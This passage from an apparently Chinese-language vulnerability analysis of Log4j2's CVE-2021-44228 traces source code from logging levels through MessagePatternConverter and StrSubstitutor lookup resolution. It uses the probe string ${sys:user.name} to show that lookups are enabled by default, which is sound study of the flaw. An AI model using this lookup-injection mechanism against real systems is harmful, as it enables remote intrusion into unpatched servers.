#INFO&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #DEBUG&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #TRACE&#125; (least specific, a lot of data)&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #ALL&#125; (least specific, all data)&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Typically, configuring a level in a filter or on a logger will cause logging events of that level and those that are</span></span><br><span class="line"><span class="comment"> * more specific to pass through the filter. A special level, &#123;<span class="doctag">@link</span> #ALL&#125;, is guaranteed to capture all levels when</span></span><br><span class="line"><span class="comment"> * used in logging configurations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Level</span> <span class="keyword">implements</span> <span class="title class_">Comparable</span>&lt;Level&gt;, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// No events will be logged.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level OFF;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A severe error that will prevent the application from continuing.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level FATAL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An error in the application, possibly recoverable.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level ERROR;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An event that might possible lead to an error.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level WARN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An event for informational purposes.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level INFO;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A general debugging event.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level DEBUG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A fine-grained debug message, typically capturing the flow through the application.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level TRACE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All events should be logged.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Level ALL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// @since 2.1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CATEGORY</span> <span class="operator">=</span> <span class="string">&quot;Level&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ConcurrentMap&lt;String, Level&gt; LEVELS = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(); <span class="comment">// SUPPRESS CHECKSTYLE</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1581082L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        OFF = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;OFF&quot;</span>, StandardLevel.OFF.intLevel());</span><br><span class="line">        FATAL = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;FATAL&quot;</span>, StandardLevel.FATAL.intLevel());</span><br><span class="line">        ERROR = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;ERROR&quot;</span>, StandardLevel.ERROR.intLevel());</span><br><span class="line">        WARN = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;WARN&quot;</span>, StandardLevel.WARN.intLevel());</span><br><span class="line">        INFO = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;INFO&quot;</span>, StandardLevel.INFO.intLevel());</span><br><span class="line">        DEBUG = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;DEBUG&quot;</span>, StandardLevel.DEBUG.intLevel());</span><br><span class="line">        TRACE = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;TRACE&quot;</span>, StandardLevel.TRACE.intLevel());</span><br><span class="line">        ALL = <span class="keyword">new</span> <span class="title class_">Level</span>(<span class="string">&quot;ALL&quot;</span>, StandardLevel.ALL.intLevel());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> intLevel;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StandardLevel standardLevel;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Level</span><span class="params">(<span class="keyword">final</span> String name, <span class="keyword">final</span> <span class="type">int</span> intLevel)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Strings.isEmpty(name)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal null or empty Level name.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (intLevel &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Illegal Level int less than zero.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.intLevel = intLevel;</span><br><span class="line">        <span class="built_in">this</span>.standardLevel = StandardLevel.getStandardLevel(intLevel);</span><br><span class="line">        <span class="keyword">if</span> (LEVELS.putIfAbsent(name, <span class="built_in">this</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Level &quot;</span> + name + <span class="string">&quot; has already been defined.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Gets the integral value of this Level.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the value of this Level.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">intLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.intLevel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Gets the standard Level values as an enum.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> an enum of the standard Levels.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> StandardLevel <span class="title function_">getStandardLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> standardLevel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>StandardLevel.ERROR.intLevel()方法则是获取ERROR的等级数，即200，而StandardLevel是一个枚举类，在其中记录了不同级别的日志记录，OFF&gt;FATAL&gt;ERROR&gt;WARN&gt;INFO&gt;DEBUG&gt;TRACE&gt;ALL。根据实际测试，在默认情况下，只会将ERROR和FATAL等级的日志输出至控制台。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.logging.log4j.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.EnumSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard Logging Levels as an enumeration for use internally. This enum is used as a parameter in any public APIs.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">StandardLevel</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// No events will be logged.</span></span><br><span class="line">    OFF(<span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A severe error that will prevent the application from continuing.</span></span><br><span class="line">    FATAL(<span class="number">100</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An error in the application, possibly recoverable.</span></span><br><span class="line">    ERROR(<span class="number">200</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An event that might possible lead to an error.</span></span><br><span class="line">    WARN(<span class="number">300</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An event for informational purposes.</span></span><br><span class="line">    INFO(<span class="number">400</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A general debugging event.</span></span><br><span class="line">    DEBUG(<span class="number">500</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// A fine-grained debug message, typically capturing the flow through the application.</span></span><br><span class="line">    TRACE(<span class="number">600</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All events should be logged.</span></span><br><span class="line">    ALL(Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> EnumSet&lt;StandardLevel&gt; LEVELSET = EnumSet.allOf(StandardLevel.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> intLevel;</span><br><span class="line"></span><br><span class="line">    StandardLevel(<span class="keyword">final</span> <span class="type">int</span> val) &#123;</span><br><span class="line">        intLevel = val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the integer value of the Level.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the integer value of the Level.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">intLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> intLevel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Method to convert custom Levels into a StandardLevel for conversion to other systems.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> intLevel The integer value of the Level.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The StandardLevel.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> StandardLevel <span class="title function_">getStandardLevel</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> intLevel)</span> &#123;</span><br><span class="line">        <span class="type">StandardLevel</span> <span class="variable">level</span> <span class="operator">=</span> StandardLevel.OFF;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> StandardLevel lvl : LEVELSET) &#123;</span><br><span class="line">            <span class="keyword">if</span> (lvl.intLevel() &gt; intLevel) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            level = lvl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> level;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，如上值继续进入logIfEnabled方法中，见下图所示。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/2.png"></p><p>通过isEnabled方法的判断后，到达logMessage方法中，在其中调用了logMessageSafely方法。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/3.png"></p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/4.png"></p><p>logMessageSafely方法中调用到了logMessageTrackRecursion方法，其中又调用了tryLogMessage方法，tryLogMessage中调用了log方法。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/5.png"></p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/6.png"></p><p>……</p><h3 id="消息格式化"><a href="#消息格式化" class="headerlink" title="消息格式化"></a>消息格式化</h3><p>省略中间的一些非关键调用，直到断点到达org.apache.logging.log4j.core.pattern.PatternFormatter#format方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (skipFormattingInfo) &#123;</span><br><span class="line">        converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/7.png"></p><p>从此处开始跟进，进入到org.apache.logging.log4j.core.pattern.MessagePatternConverter#format方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Formats an event into a string buffer.</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">doRender</span> <span class="operator">=</span> textRenderer != <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">StringBuilder</span> <span class="variable">workingBuilder</span> <span class="operator">=</span> doRender ? <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="number">80</span>) : toAppendTo;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">offset</span> <span class="operator">=</span> workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable) msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO can we optimize this?</span></span><br><span class="line">        <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !noLookups) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (doRender) &#123;</span><br><span class="line">            textRenderer.render(workingBuilder, toAppendTo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">        String result;</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiformatMessage) &#123;</span><br><span class="line">            result = ((MultiformatMessage) msg).getFormattedMessage(formats);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = msg.getFormattedMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">            toAppendTo.append(config != <span class="literal">null</span> &amp;&amp; result.contains(<span class="string">&quot;$&#123;&quot;</span>)</span><br><span class="line">                    ? config.getStrSubstitutor().replace(event, result) : result);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            toAppendTo.append(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个方法中会对config与noLookups进行判断，noLookups在MessagePatternConverter类被实例化时会被赋值，即在默认情况下，值为false，也就意味着默认情况下允许查询。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Private constructor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> options</span></span><br><span class="line"><span class="comment"> *            options, may be null.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">MessagePatternConverter</span><span class="params">(<span class="keyword">final</span> Configuration config, <span class="keyword">final</span> String[] options)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(<span class="string">&quot;Message&quot;</span>, <span class="string">&quot;message&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.formats = options;</span><br><span class="line">    <span class="built_in">this</span>.config = config;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">noLookupsIdx</span> <span class="operator">=</span> loadNoLookups(options);</span><br><span class="line">    <span class="built_in">this</span>.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.textRenderer = loadMessageRenderer(noLookupsIdx &gt;= <span class="number">0</span> ? ArrayUtils.remove(options, noLookupsIdx) : options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * LOG4J2-2109 if &#123;<span class="doctag">@code</span> true&#125;, MessagePatternConverter will always operate as though</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;%m&#123;nolookups&#125;&lt;/pre&gt; is configured.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</span> <span class="operator">=</span> PropertiesUtil.getProperties().getBooleanProperty(</span><br><span class="line">        <span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>这样便会进入到if分支，获取${}及其中的内容，也就是${sys:user.name}。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/8.png"></p><p>然后调用到workingBuilder.append(config.getStrSubstitutor().replace(event, value))。</p><h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><p>即进入到StrSubstitutor#replace()方法中。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/9.png"></p><p>这个方法所属的类StrSubstitutor是Log4j2中用于字符替换的核心类。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/10.png"></p><p>继续往下跟进，到达StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List&lt;java.lang.String&gt;)方法。</p><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/11.png"></p><p>这个方法中，会通过一个while循环来逐字符会寻找变量前缀${，当找到后会继续寻找后缀}，并会处理嵌套变量。</p><p>然后进行变量解析，此处会调用resolveVariable方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// resolve the variable</span></span><br><span class="line"><span class="type">String</span> <span class="variable">varValue</span> <span class="operator">=</span> resolveVariable(event, varName, buf, startPos, endPos);</span><br><span class="line"><span class="keyword">if</span> (varValue == <span class="literal">null</span>) &#123;</span><br><span class="line">    varValue = varDefaultValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (varValue != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// recursive replace</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">varLen</span> <span class="operator">=</span> varValue.length();</span><br><span class="line">    buf.replace(startPos, endPos, varValue);</span><br><span class="line">    altered = <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">change</span> <span class="operator">=</span> substitute(event, buf, startPos, varLen, priorVariables);</span><br><span class="line">    change = change + (varLen - (endPos - startPos));</span><br><span class="line">    pos += change;</span><br><span class="line">    bufEnd += change;</span><br><span class="line">    lengthChange += change;</span><br><span class="line">    chars = getChars(buf); <span class="comment">// in case buffer was altered</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Internal method that resolves the value of a variable.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Most users of this class do not need to call this method. This method is</span></span><br><span class="line"><span class="comment"> * called automatically by the substitution process.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Writers of subclasses can override this method if they need to alter</span></span><br><span class="line"><span class="comment"> * how each substitution occurs. The method is passed the variable&#x27;s name</span></span><br><span class="line"><span class="comment"> * and must return the corresponding value. This implementation uses the</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #getVariableResolver()&#125; with the variable&#x27;s name as the key.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> event The LogEvent, if there is one.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> variableName  the name of the variable, not null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> buf  the buffer where the substitution is occurring, not null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startPos  the start position of the variable including the prefix, valid</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> endPos  the end position of the variable including the suffix, valid</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the variable&#x27;s value or &lt;b&gt;null&lt;/b&gt; if the variable is unknown</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                 <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在resolveVariable方法中调用到了Interpolator#lookup方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Resolves the specified variable. This implementation will try to extract</span></span><br><span class="line"><span class="comment"> * a variable prefix from the given variable name (the first colon (&#x27;:&#x27;) is</span></span><br><span 